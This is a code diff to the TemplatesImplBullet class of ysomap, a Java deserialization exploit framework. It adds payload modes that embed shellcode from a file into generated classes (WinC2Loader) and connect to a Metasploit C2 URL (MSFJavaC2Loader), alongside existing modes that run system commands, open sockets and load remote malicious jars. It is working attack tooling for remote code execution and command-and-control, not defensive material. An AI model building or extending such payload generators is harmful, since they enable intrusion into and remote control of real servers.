@@ -1,5 +1,8 @@
 package ysomap.bullets.jdk;
 
+
+
+import loader.RemoteFileHttpExecutor;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -10,19 +13,19 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
 import javassist.*;
-import loader.DnslogLoader;
-import loader.RemoteFileHttpExecutor;
-import loader.RemoteFileHttpLoader;
-import loader.RemoteFileLoader;
+import loader.*;
+import c2.*;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
+import ysomap.core.util.FileHelper;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
 import java.io.IOException;
 import java.io.Serializable;
+import java.util.Arrays;
 import java.util.UUID;
 
 /**
@@ -47,11 +50,12 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
     private Class transformerFactoryImpl;
 
     @NotNull
-    @Require(name = "type", detail = "4种方式（cmd,code,socket,loader）:\n" +
-                                "1. cmd，body写入具体的系统命令；\n" +
-                                "2. code, body写入具体需要插入执行的代码；\n" +
-                                "3. socket, body写入`ip:port`\n" +
-                                "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`")
+    @Require(name = "type", detail = "5种方式（cmd,code,socket,loader,shellcode）:\n" +
+            "1. cmd，body写入具体的系统命令；\n" +
+            "2. code, body写入具体需要插入执行的代码；\n" +
+            "3. socket, body写入`ip:port`\n" +
+            "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`\n" +
+            "5. c2, body写入C2相关参数，写入格式如 `path` 或 `url`, 具体查看相关 c2 说明 ")
     private String type = "cmd";
 
     @NotNull
@@ -60,8 +64,8 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
 
     @NotNull
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
-                                                      "可选default、" +
-            "TomcatEcho、SocketEcho、RemoteFileLoader、" +
+            "可选default、" +
+            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
             "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader")
     private String effect = "default";
 
@@ -79,7 +83,7 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
             }else{
                 processedBody = PayloadHelper.makeExceptionPayload(processedBody);
             }
-        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type)){
+        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type) || "c2".equals(type)){
             // do nothing
         }
 
@@ -141,6 +145,18 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
             pool.appendClassPath(new ClassClassPath(DnslogLoader.class));
             cc = pool.getCtClass(DnslogLoader.class.getName());
             cc.setName("Loader"+System.currentTimeMillis());
+        }else if("WinC2Loader".equals(effect)){
+            byte[] shellcode = FileHelper.getFileContent(body);
+            String shellcodeStr = Arrays.toString(shellcode);
+            code = "shellcode = new byte[]{" + shellcodeStr.substring(1, shellcodeStr.length() - 1) +  "};";
+            pool.appendClassPath(new ClassClassPath(WinC2Loader.class));
+            cc = pool.getCtClass(WinC2Loader.class.getName());
+            cc.setName("ShellCode"+System.currentTimeMillis());
+        }else if("MSFJavaC2Loader".equals(effect)){
+            code = "url=\""+body+"\";";
+            pool.appendClassPath(new ClassClassPath(MSFJavaC2Loader.class));
+            cc = pool.getCtClass(MSFJavaC2Loader.class.getName());
+            cc.setName("MSFJavaC2Loader"+System.currentTimeMillis());
         }
 
         if(cc != null){
